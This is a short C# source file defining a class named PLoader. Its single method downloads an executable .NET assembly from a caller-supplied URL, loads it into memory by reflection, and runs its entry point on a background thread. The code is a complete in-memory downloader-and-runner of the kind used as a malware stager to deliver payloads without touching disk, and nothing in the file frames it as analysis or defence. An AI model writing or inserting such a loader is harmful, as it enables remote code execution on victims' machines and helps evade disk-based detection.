using System;
using System.Net;
using System.Reflection;
using System.Threading;

namespace Loader
{
    internal static class PLoader
    {
        #region Variables
        private static readonly WebClient client = new();
        #endregion

        /// <summary>
        /// Run a EXE File from a URL, then call it's entry point function.
        /// </summary>
        /// <param name="host">The URL</param>
        public static void mem_st_call(string host) =>
            new Thread(() =>
            {
                try
                {
                    var asm = Assembly.Load(client.DownloadData(host));
                    asm.EntryPoint.Invoke(null, null);
                    client.Dispose();
                }
                catch (Exception ex) { Console.WriteLine($"Error: {ex}"); }
            }).Start();
    }
}
